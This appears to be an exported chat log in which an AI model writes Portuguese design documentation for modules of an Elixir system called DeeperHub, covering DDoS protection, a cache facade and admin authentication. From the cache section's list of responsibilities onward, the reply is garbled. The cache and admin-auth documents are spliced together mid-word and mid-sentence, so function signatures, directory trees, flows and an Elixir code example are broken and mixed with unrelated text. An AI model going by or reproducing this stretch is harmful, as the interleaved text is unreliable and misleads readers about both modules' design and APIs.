*   `DeeperHub.Security.IPFirewallService`: Para efetivamente bloquear/desbloquear IPs.
*   `DeeperHub.API.RateLimiterFacade`: Para a mecânica de contagem de taxa.
*   `DeeperHub.Security.Monitoring`: Para enviar alertas.
*   `DeeperHub.Audit`: Para registrar ações de bloqueio.

### 8.2. Bibliotecas Externas

*   Nenhuma específica para a lógica central, mas pode usar bibliotecas de análise de log se o `PatternAnalyzer` for complexo.

## 🤝 9. Como Usar / Integração

*   **Plug no Pipeline Phoenix (Essencial):**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :secure_api do
      plug DeeperHub.Security.Plugs.IPFirewallPlug # Primeiro, IPs já conhecidos como maus
      plug DeeperHub.Security.Plugs.DdosProtectionPlug # Depois, lógicas de DDoS
      # ... outros plugs de segurança e API ...
    end
    ```
*   **Chamadas de Serviços de Monitoramento:** Serviços que monitoram o estado geral do sistema podem chamar `DdosProtection.get_statistics/1` e, se certos limiares forem atingidos, podem chamar `DdosProtection.set_advanced_protection(true, ...)`.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o `DdosProtectionPlug` para garantir que ele bloqueia/limita requisições corretamente.
*   Testar a lógica do `DdosProtectionService` para diferentes padrões de tráfego (normal, pico, flood).
*   Testar a ativação e os efeitos do modo de proteção avançada.
*   Testar a integração com `IPFirewallService` para bloqueios.
*   Localização: `test/deeper_hub/security/ddos_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.ddos.requests_processed.count` (tags: `path`, `action_taken` (`allowed`, `rate_limited`, `blocked`))
*   `deeper_hub.security.ddos.global_rps.gauge` (Gauge): Requisições por segundo globais para a aplicação.
*   `deeper_hub.security.ddos.ip_blocked_ddos.count` (tags: `reason`)
*   `deeper_hub.security.ddos.advanced_mode_active.gauge` (Gauge, 0 ou 1)

### 10.3. Logs

*   **Nível INFO:** Transição para/de modo de proteção avançada.
*   **Nível WARNING:** IP bloqueado devido a atividade DDoS. Limite de taxa global se aproximando de um limiar de alerta.
*   **Nível ERROR:** Falha ao aplicar uma política de DDoS.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ddos, :request_checked]`
    *   Metadados: `%{ip: ip, path: path, result: :allowed | :rate_limited | :blocked, current_rps_for_ip: rps}`
*   `[:deeper_hub, :security, :ddos, :ip_action]`
    *   Metadados: `%{ip: ip, action: :blocked | :unblocked, reason: reason, duration: dur}`
*   `[:deeper_hub, :security, :ddos, :protection_mode_changed]`
    *   Metadados: `%{new_mode: :standard | :advanced, triggered_by: :manual | :auto}`

## ❌ 11. Tratamento de Erros

*   Falhas no serviço de DDoS não devem impedir o tráfego legítimo se possível (ex: falha segura para o modo \"permitir\").
*   Erros ao interagir com `IPFirewallService` ou `RateLimiterFacade` devem ser logados, e o sistema de DDoS pode precisar operar em modo degradado.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Falsos Positivos:** Bloquear IPs legítimos é um risco. As políticas devem ser cuidadosamente calibradas. O modo \"monitor\" ou desafios (CAPTCHA) podem ser usados antes de bloqueios agressivos.
*   **Evasão:** Atacantes sofisticados usarão redes de bots distribuídas. A proteção no nível da aplicação é apenas uma camada.
*   **Saturação de Recursos do Próprio Módulo:** Se o rastreamento de cada requisição for muito custoso, o próprio módulo de proteção DDoS pode se tornar um gargalo. O uso de ETS e amostragem para análise de padrões pode ser necessário.

## 🧑‍💻 13. Contribuição

*   Novas regras de detecção de padrões devem ser testadas contra tráfego real ou simulado.
*   A integração com WAFs ou serviços de mitigação de nuvem deve ser feita através de adaptadores claros.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar detecção de padrões de ataque mais sofisticados no `PatternAnalyzer` (ex: análise de User-Agent, frequência de tipos de requisição por IP).
*   [ ] Adicionar desafios JavaScript \"I'm not a robot\" como uma etapa antes do CAPTCHA completo para tráfego levemente suspeito.
*   [ ] Permitir que as políticas de DDoS sejam ajustadas dinamicamente com base na carga atual do sistema ou em alertas de outros sistemas de monitoramento.
*   [ ] Integração com feeds de IP de botnets conhecidas para popular proativamente as blocklists.
*   [ ] Suporte para \"fingerprinting\" de cliente mais avançado para diferenciar bots de tráfego humano, mesmo de IPs compartilhados.

---

*Última atualização: 2025-05-12*

---

Com isso, cobrimos uma parte significativa da proteção de entrada.

O que você gostaria de ver em seguida?
Podemos continuar com os outros módulos de segurança como `SqlInjectionProtection` (que já documentamos) ou `PathTraversalProtection` (também já documentado), ou talvez mudar o foco para algo no Core como `DeeperHub.Core.Cache` ou `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Já documentamos `DeeperHub.Security.SqlInjectionProtection` e `DeeperHub.Security.PathTraversalProtection`.

Dado que o `DeeperHub.Core.Cache` foi mencionado como uma dependência e otimização em vários módulos, vamos detalhá-lo agora. É um componente de infraestrutura essencial.

---

# Módulo: `DeeperHub.Core.Cache` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.Cache`

O módulo `DeeperHub.Core.Cache` fornece uma **fachada e um serviço de caching genérico** para o sistema DeeperHub. Seu propósito é melhorar o desempenho da aplicação armazenando temporariamente dados frequentemente acessados ou resultados de operações custosas, reduzindo a latência e a carga sobre fontes de dados primárias (como bancos de dados ou APIs externas).

Ele oferece uma API simples para operações de cache como `put`, `get`, `delete`, e `get_or_store`, abstraindo a implementação de cache subjacente (que pode ser ETS, Redis, Memcached, etc., através de um `CacheAdapter`). 😊

*(Nota: A documentação original tem `DeeperHub.Shared.Cache` e `DeeperHub.Shared.Cache.CacheService` e `CacheAdapter`. Esta documentação consolida a fachada principal em `DeeperHub.Core.Cache` e assume que a lógica de serviço e adaptação reside em `DeeperHub.Shared.Cache.*` ou é diretamente gerenciada pela fachada se for uma implementação simples como ETS.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Armazenamento Chave-Valor:**
    *   Armazenar dados associados a uma chave única (`put/4`).
    *   Recuperar dados com base em uma chave (`get/3`).
*   **Expiração de Cache (TTL - Time To Live):**
    *   Permitir a definição de um tempo de vida para cada entrada de cache.
    *   Automaticamente considerar entradas expiradas como \"misses\".
*   **Invalidação de Cache:**
    *   Remover entradas específicas do cache (`delete/2`).
    *   Remover todas as entradas de um namespace (se suportado) ou o cache inteiro (`clear/1`).
    *   Remover entradas que correspondem a um padrão de chave (`delete_pattern/2`).
*   **Operação \"Get-Or-Store\" (`get_or_store/4`):**
    *   Tentar obter um valor do cache; se for um \"miss\" (não encontrado ou expirado), executar uma função fornecida para gerar o valor, armazená-lo no cache e então retorná-lo.
*   **Suporte a Namespaces (Opcional):**
    *   Permitir a organização de chaves de cache em namespaces para evitar colisões e facilitar a invalidação em grupo.
*   **Operações Atômicas (Opcional, dependendo do backend):**
    *   Suporte para operações como `increment/4` e `decrement/4` para contadores em cache.
    *   Suporte para operações em conjuntos (ex: `add_to_set/3`).
*   **Abstração de Backend de Cache:**
    *   Fornecer uma interface (`CacheBehaviour`) para que diferentes backends de cache (ETS, Redis, etc.) possam ser usados de forma intercambiável.
*   **Métricas e Observabilidade:**
    *   Registrar métricas como taxa de acerto (hit rate), taxa de erro (miss rate), tamanho do cache, latência das operações de cache.
*   **Limpeza de Entradas Expiradas (para backends que não fazem isso automaticamente):**
    *   ImplementJá detalhamos `DeeperHub.Security.SqlInjectionProtection` e `DeeperHub.Security.ar ou configurar um mecanismo para remover periodicamente entradas expiradas para liberar memória (especialmente para caches em memória como ETS).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.PathTraversalProtection`.

Que tal seguirmos com `DeeperHub.Security.AdminAuth`? A segurança da interface administrativa é um ponto crítico em qualquer sistema.

---

# Módulo: `DeeperHub.Security  **`DeeperHub.Core.Cache` (Fachada Pública):**
    *   Ponto de entrada para todas as operações de cache.
    *   Delega chamadas para o `DeeperHub.Shared.AdminAuth` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.AdminAuth`

O módulo `DeeperHub.Security.AdminAuth` é dedicado especificamente à **.Cache.CacheAdapter` configurado.
2.  **`DeeperHub.Shared.Cache.CacheAdapter` (GenServer):**
    *   **Responsabilidade:** Gerencia a lógica de interação com a implementação de cache escolhida.
    *   **Interautenticação e autorização de usuários administradores** que acessam as interfaces de gerenciamento e administração do sistema DeeperHub. Eleações:** Recebe chamadas da fachada e as traduz para operações no backend de cache (ex: `EtsCache fornece um conjunto de funcionalidades de segurança mais rigorosas e adaptadas às necessidades de contas com privilégios elevados.

Is`).
    *   Pode lidar com a lógica de serialização/desserialização se o backend de cache exigir.
3.  **`so pode incluir:
*   Autenticação de dois fatores (MFA/TOTP) obrigatória ou fortementeDeeperHub.Shared.Cache.CacheBehaviour` (Behaviour):**
    *   Define a interface que todas as implementações de backend de cache devem seguir.
4.  **Implementações de Backend de Cache (Exemplos):**
    *    recomendada.
*   Políticas de senha mais estritas.
*   Monitoramento e auditoria detalhada de todas**`DeeperHub.Shared.Cache.EtsCache` (GenServer ou módulo funcional usando ETS):**
        *   Implementação de cache em memória usando tabelas ETS.
        *   Gerencia TTLs e limpeza de entradas expiradas.
    *    as ações administrativas.
*   Gerenciamento de sessões de administrador com timeouts mais curtos.
*   Controle de acesso granular**`DeeperHub.Shared.Cache.RedisAdapter` (Módulo):**
        *   Adaptador para interagir com um servidor Redis externo (usando uma biblioteca como `Redix`).
    *   **`DeeperHub.Shared.Cache.No às diferentes funcionalidades administrativas baseado em papéis e permissões específicas de administração.

O objetivo é proteger as áreas mais sensíveis do sistema DeeperHub contra acesso não autorizado e abuso de privilégios. 😊

*(Nota: Se a autenticação de administrOpCache` (Módulo Funcional):**
        *   Uma implementação que não faz nada, efetivamente desabilitando o cache. Útil para desenvolvimento ou testes.
5.  **`DeeperHub.Shared.Cache.adores for gerenciada pelo mesmo sistema que usuários regulares (`DeeperHub.Auth`) mas com políticas diferentes, este módulo pode atMetricsReporter` (GenServer):**
    *   Coleta e armazena métricas sobre o desempenho do cache.
6uar como uma camada de especialização ou configuração sobre `DeeperHub.Auth`. Se for um sistema completamente separado, ele terá seus próprios componentes de login, sessão, etc.)*

## 🎯 2. Responsabilidades e Funcional.  **`DeeperHub.Shared.Cache.Supervisor`:**
    *   Supervisiona os processosidades Chave

*   **Autenticação de Administradores (`authenticate_admin/3`):**
    *   Ver relacionados ao cache (ex: `CacheAdapter`, `EtsCache GenServer`, `MetricsReporter`).
7.  **Configurações (via `DeeperHub.Core.ConfigManager`):**
    *   Qual adaptador de cache usar, TTLificar credenciais (username/password) específicas para contas de administrador.
    *   Forçar ou gerenciar a vers padrão, configurações específicas do backend (ex: URL do Redis).

### 3.2. Estrutura de Diretórios (Proposta para `Shared.Cache`)

```
lib/deeper_hub/shared/cache/
├── cache_adapter.ex                # GenServer que delega para a implementação
├── cache_behaviour.ex              ificação de Autenticação Multifator (MFA), especialmente TOTP (via `AdminTOTPService`).
*# Behaviour para implementações de cache
│
├── implementations/                # Ou apenas no mesmo nível se forem poucos
│   ├── ets_   **Gerenciamento de Contas de Administrador (`create_admin/1`, `update_admin/2`, etc.):**
    *   Criação, atualização, ativação/desativação de contas de administrador.
    *   Atcache.ex                # Implementação com ETS (pode ser GenServer)
│   ├── redis_adapter.ex            ribuição de papéis e permissões administrativas específicas (integrando com `DeeperHub.RBAC`).
*   **Pol# Adaptador para Redis
│   └── no_op_cache.ex              # Cache que não faz nada
│
├── metrics_reporter.ex             # GenServer para coletar métricas de cache
├── supervisor.ex                   # Supervisor paraíticas de Senha de Administrador:**
    *   Aplicar políticas de complexidade e expiração de senha mais rigorosas para administradores.
*   **Gerenciamento de Sessões de Administrador:**
    *   Criar sessões com durações e os GenServers do cache
└── telemetry.ex                    # Para emitir eventos de telemetria do cache
```
E a fachada em:
```
lib/deeper_hub/core/cache.ex        # Fachada Pública
```

### timeouts de inatividade potencialmente mais curtos.
    *   Invalidar sessões de administrador (ex: após mudança de senha, detecção de risco).
    *   Gerenciar tokens de sessão específicos para administradores (via `Admin 3.3. Decisões de Design Importantes

*   **Abstração de Backend:** A capacidadeTokenService`).
*   **Autorização de Ações Administrativas (`authorize_action/4`, `has_admin de trocar o backend de cache (ex: de ETS para Redis) sem alterar o código da aplicação é uma grande vantagem.
*   **Cons_permission?/2`):**
    *   Verificar se um administrador autenticado tem permissão para executar uma ação administrativaistência de Chaves:** Definir uma estratégia clara para nomeação de chaves de cache, incluindo namespaces, para evitar colis específica ou acessar uma funcionalidade do painel de controle.
    *   Potencialmente exigir verificação MFA adicional para açõesões.
*   **Estratégias de Invalidação:** Além do TTL, considerar estratégias de invalidação base administrativas de alto risco, mesmo se já logado (step-up authentication).
*   **Auditoria Detalhada (`adas em eventos (ex: quando um dado no DB é atualizado, invalidar a entrada de cache correspondente).
*   **AdminActionLog`):**
    *   Registrar todas as tentativas de login de administrador (sucesso e falTratamento de Falhas no Cache:** Falhas no serviço de cache não devem impedir o funcionamento da aplicação. Oha).
    *   Registrar todas as ações significativas realizadas por administradores autenticados.
*   **Ger sistema deve ser capaz de operar (com degradação de performance) se o cache estiver indisponível, buscando osenciamento de Tokens de Administrador (`AdminTokenService`):**
    *   Geração, validação e revogação de tokens de dados da fonte primária.

## 🛠️ 4. Casos de Uso Principais

*   **Caching de Dados de Usuário Frequentemente Acessados:**
    *   Ao buscar o perfil de um usuário, o `D sessão para administradores.
*   **Proteção contra Força Bruta para Login de Admin:**
    *   Aplicar políticas de bloqueio mais estritas para tentativas falhas de login de administrador.

## 🏗️ 3. Arquitetura eeeperHub.Accounts.ProfileService` primeiro verifica o cache: `Cache.get(\"user_profile:#{user_id}\")`.
    *   Se for um \"miss\", busca no DB, e depois armazena no cache: Design

A arquitetura pode variar dependendo se é uma extensão do `DeeperHub.Auth` ou um subsistema mais independente. Assumindo uma especialização:

### 3.1. Componentes Principais

1.  ** `Cache.put(\"user_profile:#{user_id}\", profile_data, ttl: 3600)`.
*   **Caching de Resultados de Consultas Complexas:**
    *   Um serviço que gera um relatório custoso pode usar `Cache`DeeperHub.Security.AdminAuth` (Fachada Pública):**
    *   Ponto de entrada para funcionalidades de autenticação e autorização de administradores.
    *   Delega para `AdminAuthService`..get_or_store(\"reports:monthly_sales:#{month}\", fn -> generate_sales_report(
2.  **`DeeperHub.Security.AdminAuth.Services.AdminAuthService`:**
    *   Serviço central que orquestra a autenticação, gerenciamento de contas e verificação de permissões de admin.
    *   Utiliza `month) end, ttl: 86400)`.
*   **Contadores em Cache:**
    *   Rastrear o número de visualizações de um post: `Cache.increment(\"post_views:#{post_id}\")AdminTOTPService`, `AdminTokenService`, `PermissionService` (específico para admin ou o RBAC geral),`.
*   **Invalidação de Cache Baseada em Eventos:**
    *   O `DeeperHub.Accounts.Profile e `AdminActionAuthService`.
3.  **`DeeperHub.Security.AdminAuth.Services.AdminTOTPService`:**
    *   Gerencia a configuração e verificação de TOTP para administradores.
4.  **`Service`, ao atualizar um perfil, publica um evento `profile_updated`.
    *   Um assinante desse evento (poderDeeperHub.Security.AdminAuth.Services.AdminTokenService`:**
    *   Gerencia o ciclo de vida de tokens de sessão para administradores.
5.  **`DeeperHub.Security.AdminAuth.Services.AdminActionAuthServiceia ser o próprio `ProfileService` ou um worker dedicado) chama `Cache.delete(\"user_profile:#{updated_user_id}\")`.

## 🌊 5. Fluxos Importantes

### Fluxo de `get_or_store/`:**
    *   Verifica se um admin está autorizado a realizar uma ação específica, possivelmente exigindo \"step-up authentication\" com MFA.
6.  **`DeeperHub.Security.AdminAuth.Services4`

1.  **Chamador:** Um serviço chama `DeeperHub.Core.Cache.get_or_store(key, generator_fun, ttl, namespace)`.
2.  **`Core.Cache` (Fachada):.PermissionService` (ou integração com `DeeperHub.RBAC`):**
    *   Define e verifica permissões granulares para o painel de administração (ex: \"gerenciar_usuarios\", \"ver_logs_auditoria\", \"configurar_sistema\").
7.  **Schemas Ecto:**
    *   `D** Delega para `Shared.Cache.CacheAdapter.get_or_store(...)`.
3.  **`Shared.Cache.CacheAdapter`:**
    *   Chama `get(key, namespace)` na implementação de backend configurada (ex: `EtsCache`).
4.  **Backend de Cache (ex: `EtseeperHub.Security.AdminAuth.Schema.AdminSchema`: Para dados da conta de administrador.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminToken`: Para tokens de sessão de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminTOTP`: Para configurações TOTP de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminActionLog`: Para auditoria de ações de admin.
    *   `DCache`):**
    *   Verifica se a `key` existe e não está expirada.
    *   **Cache Hit:** Se sim, retorna `{:ok, cached_value}` para o `CacheAdapter`.
    *   **Cache Miss:** Se não, retorna `{:error, :not_found}` para o `CacheAdapter`.
5.  **`Shared.Cache.CacheAdapter`:**
    *   **Se Cache Hit:** Retorna o `cached_value`eeperHub.Security.AdminAuth.Schema.AdminAction`, `AdminActionRisk`, `AdminActionVerification`: Para definir e controlar o risco de ações administrativas.
8.  **Integração com `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`:**
    *   Para políticas de senha de admin, duração de sessão de admin, políticas para a fachada, que retorna para o chamador.
    *   **Se Cache Miss:**
        *   Executa a `generator_fun.()`.
        *   Se a função retornar `{:ok, new_value}`:
            *   Chama `put(key, new_value, ttl, namespace)` na implementação de backend.
            *   Ret de MFA de admin.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/admin_auth/
├── admin_auth.ex                     # Fachada Pública (AdminAuthAdapter da doc original)
│
├── services/
│   ├── admin_auth_service.ex         # Serviçoorna `new_value` para a fachada.
        *   Se a função retornar `{:error, reason}`:
            *   Loga o erro.
            *   Retorna `{:error, reason}` para a fachada (e não armazena no cache).
6.  **`Core.Cache` (Fachada):** Retorna o valor orquestrador
│   ├── admin_totp_service.ex
│   ├── admin_token_service.ex
│   ├── admin_action_auth_service.ex
│   └── permission_service.ex         # (Ou usa DeeperHub.RBAC diretamente)
│
├── schemas/                          # (Ou schema/ singular (do cache ou gerado) ou o erro para o chamador.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Core.Cache`)

*(Baseado na API do `DeeperHub.Shared)
│   ├── admin_schema.ex
│   ├── admin_token.ex
│   ├── admin_totp.ex
│   ├── admin_action_log.ex
│   ├── admin_action.ex
│   ├── admin_action_risk.ex
│   └── admin_action_verification.ex
│
├── supervisor.ex
└── telemetry.ex                      # (Se necessário, específico para AdminAuth)
```

### 3.3. Decisões de Design.Cache.CacheService` e `CacheAdapter` da documentação original, consolidando e usando TTLs em segundos para consistência).*

### 6.1. `DeeperHub.Core.Cache.get(key :: String.t() | atom(), default_value :: term() | nil, opts :: keyword()) :: {:ok, term()} | {:error, :not_found | term()}`

*   **Descrição:** Recupera um valor do cache.
*   **`opts Importantes

*   **Isolamento (Parcial ou Total):** Decidir se a autenticação de admin usa um fluxo completamente separado ou se é uma variação do fluxo de usuário normal com políticas mais rígidas. Um fluxo separado pode oferecer maior segurança, mas também maior complexidade.
*   **MFA Mandatório:** Para a maioria das contas de admin, MFA`:**
    *   `:namespace` (atom | String.t): Namespace opcional para a chave.
*   **Retorno:** `{:ok, value}` se encontrado e não expirado, `{:ok, default_value}` se não encontrado e default fornecido, senão `{:error, :not_found}`.

### 6.2. `DeeperHub.Core.Cache.put(key :: String.t() | atom(), value :: term(), opts :: keyword()) :: :ok | {:error, term() (especialmente TOTP ou Chaves de Segurança) deve ser mandatório ou altamente imposto.
*   **Princípio do Menor Privilégio:** Administradores devem ter apenas as permissões estritamente necessárias para suas funções. Ev}`

*   **Descrição:** Armazena um valor no cache.
*   **`opts`:**
    *   `:ttl_seconds` (integer | `:infinity`): Tempo de vida em segundos. (Padrão: config global `cache.default_ttl_seconds`)
    *   `:namespace` (atom | String.t): Namespaceitar contas \"super admin\" genéricas, se possível.
*   **Step-up Authentication:** Para ações administrativas particularmente destrutivas ou sensíveis, exigir uma nova verificação MFA mesmo que o admin já esteja logado.

##  opcional.

### 6.3. `DeeperHub.Core.Cache.delete(key :: String.t() | atom(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Remove uma entrada do cache.
*   **`opts`:** `:namespace`.

### 6.4. `DeeperHub.Core.Cache.🛠️ 4. Casos de Uso Principais

*   **Administrador Faz Login no Painel:**
    *   Admin fornece username/senha na página de login do painel.
    *   `AdminAuth.authenticate_admin/3get_or_store(key :: String.t() | atom(), generator_fun :: (() -> {:ok, term()} | {:error, term()}), opts :: keyword()) :: {:ok, term()} | {:error, term()}`

*   **` é chamado.
    *   Credenciais são validadas.
    *   Se MFA estiver configurado, o fluxo de verificação TOTP (ou outro método) é iniciado.
    *   Se tudo ok, uma sessão deDescrição:** Obtém do cache ou executa `generator_fun`, armazena e retorna o resultado.
*   **`opts`:** `:ttl_seconds`, `:namespace`.
*   **Retorno:** `{:ok, value admin é criada e um token é emitido.
*   **Administrador Tenta Excluir um Usuário:**
    *   Admin clica em \"Excluir Usuário\" na interface.
    *   A interface chama um endpoint protegido.
    *   O}` ou `{:error, reason_from_generator_or_cache_error}`.

### 6.5. `DeeperHub.Core.Cache.increment(key :: String.t() | atom(), amount :: integer() | nil, opts :: backend verifica a sessão do admin.
    *   Chama `AdminAuth.authorize_action(admin_id, : keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descrição:** Incrementdelete_user, %{target_user_id: \"xyz\"}, mfa_code_if_required)`.
    a atomicamente um valor numérico no cache. Se a chave não existir, geralmente é inicializada com `amount`.
*   **`amount`:** (Padrão: `1`)
*   **`opts`:** `:ttl_seconds`, `:namespace`.

*   `AdminActionAuthService` verifica se a ação `:delete_user` requer MFA \"step-up\". Se sim### 6.6. `DeeperHub.Core.Cache.decrement(key :: String.t() | atom(), amount :: integer() | nil, opts :: keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descrição:** Decrementa atomicamente um valor numérico.
*   *(Parâmetros e, valida `mfa_code`.
    *   Verifica se o admin tem a permissão \"pode_excluir_usuarios\" (via `PermissionService` / RBAC).
    *   Se autorizado, a ação é permitida.
    *   `AdminActionLog` registra a ação.
*   **Administrador Altera uma Configuração de Segurança Cr retorno similares a `increment/4`)*

### 6.7. `DeeperHub.Core.Cache.clear(ítica:**
    *   Similar ao caso acima, mas a ação pode ser, por exemplo, `:update_securityopts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Limpa o cache.
*   **`opts`:** `:namespace` (para limpar apenas um namespace).

### 6.8. `DeeperHub.Core.Cache.delete_pattern(key_pattern :: String.t(), opts :: keyword()) :: {:ok, count_policy_mfa`.
    *   A autorização e a possível exigência de MFA step-up são verificadas.

## 🌊 5. Fluxos Importantes

### Fluxo de Autenticação de Administrador com TOTP

1.  **Interface de Login Admin:** Admin submete username e password.
2.  **Backend_deleted :: integer()} | {:error, term()}`

*   **Descrição:** Remove entradas do cache que correspondem a um padrão de chave (ex: `\"user_profiles:*\"`, a sintaxe do padrão depende do backend).
*   **`opts`:** `:namespace`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :cache, :enabled]`** (Boolean): Habilita/desabilita o sistema de cache globalmente. (Padrão: `true`)
*   **`[:core, :cache, :default Controller:** Chama `DeeperHub.Security.AdminAuth.authenticate_admin(username, password, context)`.
3.  **`AdminAuthService`:**
    *   Valida credenciais primárias (username/password).
    *   Se falhar, retorna erro e registra tentativa falha (considerando `BruteForceProtection` para admin).
    *   Se_adapter]`** (Module): Módulo adaptador de cache padrão a ser usado (ex: `DeeperHub.Shared.Cache.Implementations.EtsCache`, `DeeperHub.Shared.Cache.Implementations.RedisAdapter`).
*   **`[:core, :cache, :default_ttl_seconds]`** (Integer): TTL padrão em segundos para novas entradas de cache se não especificado. (Padrão: `3600` - 1 hora)
*   **`[:core, :cache, :ets_cache, :cleanup_interval_ms]`** (Integer sucesso, verifica se o admin tem TOTP configurado e ativo (via `AdminTOTPService.is_enabled?(admin_id)`).
    *   **Se TOTP Ativo:** Retorna `{:error, :mfa_totp_required, %{admin_id: admin.id}}` para o controller.
    *   **Se TOTP Não Ativo (e não mandatório):** Procede para criar sessão e token (via `AdminTokenService`).
4.  **): Intervalo para limpeza de entradas expiradas no `EtsCache`. (Padrão: `60000`)
*   **`[:core, :cache, :redis_adapter, :url]`** (String): URL de conexão para o Redis, se usado.
*   **`[:core, :cache, :redis_adapter, :pool_size]`** (Integer): Tamanho do pool de conexões Redis.
*   **`[:core, :cache, :metrics_reporter, :report_interval_ms]`** (Integer): Intervalo para o `MetricsReporter` coletar/logar estatInterface de Login Admin:** Se `:mfa_totp_required`, exibe campo para código TOTP. Admin submete o código.
5.  **Backend Controller:** Chama `DeeperHub.Security.AdminAuth.Services.AdminTOTPService.verify(admin_id, totp_code)`.
6.  **`AdminTOTPService`:**
    *   Verifica o código TOTP.
    *   Se válido, retorna `{:ok, :ísticas do cache.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configurações do cache.
*   `DeeperHub.Core.Logger`: Para logging de operações e erros do cache.
*   `DeeperHub.Core.Metrics`: Para registrar métricas de desempenho do cache.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar os processos do `Shared.Cache`.

### 8.2. Bibliotecas Externas

*   Depende da implementação do backend:
    *   Nenhuma para ETS (nativo).
    *   `Redix` (ou similar) se `valid}`.
    *   Se inválido, retorna erro e registra tentativa falha de MFA.
7.  **Backend Controller (após TOTP válido):**
    *   Chama `AdminAuthService` (ou diretamente `AdminTokenService` e `SessionManager`) para criar a sessão de admin e emitir tokens.
    *   Registra login bem-sucedido no `AdminActionLog`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Security.AdminAuth`)

### 6.1. `DeeperHub.Security.AdminAuth.authenticate_admin(username :: String.t(), password :: String.t(), opts :: keyword()) :: {:ok, %RedisAdapter` for usado.
    *   Outras bibliotecas cliente para outros backends (Memcached, etc.).

## 🤝 9. Como Usar / Integração

Qualquer módulo que precise de caching pode usar a fachada `DeeperHub.Core.Cache`.

```elixir
defmodule MyApp.UserProfileService do
  alias DeeperHub.Core.Cache
  alias DeeperHub.Core.Repo
  alias MyApp.User

  def get_user_profile(user_id) do
    cache{admin: AdminSchema.t(), token: String.t()}} | {:error, :invalid_credentials | :account_locked | :mfa_required | :mfa_invalid}`

*   **Descrição:** Autentica um administrador.
*   **`opts`:** `:ip_address`, `:device_info`, `:mfa_code` (se o fluxo de MFA for em uma única etapa).

### 6.2. `DeeperHub.Security.AdminAuth.verify_admin_mfa(admin_id :: String.t(), mfa_method :: atom(), code :: String.t(), opts :: keyword()) :: {:ok, %{admin: AdminSchema.t(), token: String.t()}} | {:error, :_key = \"user_profile:#{user_id}\"
    
    Cache.get_or_store(cache_key, fn ->
      case Repo.get(User, user_id) do
        nil -> {:error, :not_found} # Não armazena :not_found no cache por padrão
        user -> {:ok, Map.from_struct(user)} # Armazena o mapa
      end
    end, ttl_seconds: 1800) # Cache por 30 minutos
  end

  def update_user_profile(user, attrs) do
    # ... lógica de atualização ...
    case Repo.update(changeset) do
      {:ok, updated_user} ->
        Cache.delete(\"user_profile:#{updated_user.id}\") # Inmfa_invalid | :max_attempts_reached}` (Nova Sugestão)

*   **Descrição:** Verifica um código MFA para um admin que já passou pela autenticação primária. Se sucesso, finaliza o login e retorna tokens.
*   **`mfa_method`:** Ex: `:totp`.

### 6.3. `DeeperHub.Security.AdminAuth.has_admin_permission?(admin_id :: String.t(), permission :: String.t() | atom(), resource_details :: map() | nil) :: boolean()`

*   **Descrição:** Verifica se um administrador possui uma permissão específica.
*   **`permission`:** Ex: `\"users:delete\"`, `:view_audit_logs`.

### 6.4. `DeeperHub.Security.AdminAuth.authorize_action(admin_id :: String.t(), action_atom :: atom(), action_params :: map() | nil, verification_data :: map() | nil) :: :ok | {:error, :unauthorized | :mfa_required_for_action | :mfa_invalid}` (valida o cache
        {:ok, updated_user}
      {:error, changeset} ->
        {:error, changeset}
    end
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada função da API do cache (`get`, `put`, `delete`, `get_or_store`, `increment`).
*   Testar a lógica de TTL e expiração.
*   Testar a invalidação por chave e por padrão.
*   Testar o comportamento com diferentes adaptadores de backend (mockeados ou reais em ambiente de teste).
*   Testar o tratamento de falhas do backend de cache (o cache não deve quebrar a aplicação).
*   Localização: `test/deeper_hub/core/cache/` e `test/deeper_hub/shared/cache/`.

### 10.2. Métricas (via `Shared.Cache.MetricsReporter` ou `Core.Metrics`)

*   `deeper_hub.core.cache.operations.count` (tags: `operation` (`get`, `put`, `delete`), `namespace`, `status` (`hit`, `miss`, `success`, `error`))
*   `deeper_hub.core.cache.operation.duration_ms` (Histograma, tags: `operation`, `namespace`)
*   `deeper_hub.core.cacheNova Sugestão)

*   **Descrição:** Autoriza uma ação administrativa, possivelmente exigindo \"step-up authentication\" (MFA).
*   **`action_atom`:** Identificador único da ação administrativa (ex: `:admin_update_user_role`).
*   **`verification_data`:** `%{mfa_code: \"123456\"}` se MFA for exigido pela política da ação.

### 6.5. Funções CRUD para Admins (ex: `create_admin/1`, `get_admin/1`, `list_admins/1`, `update_admin/2`, `deactivate_admin/2`)

*   Estas funções gerenciariam as contas dos administradores.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :admin_auth, :password_policy, :min_length]`** (Integer): Comprimento mínimo da senha de admin. (Padrão: `12`)
*   **`[:security, :admin_auth, :password_policy, :expiry_days]`** (Integer): Dias para expiração da senha de admin. (Padrão: `90`)
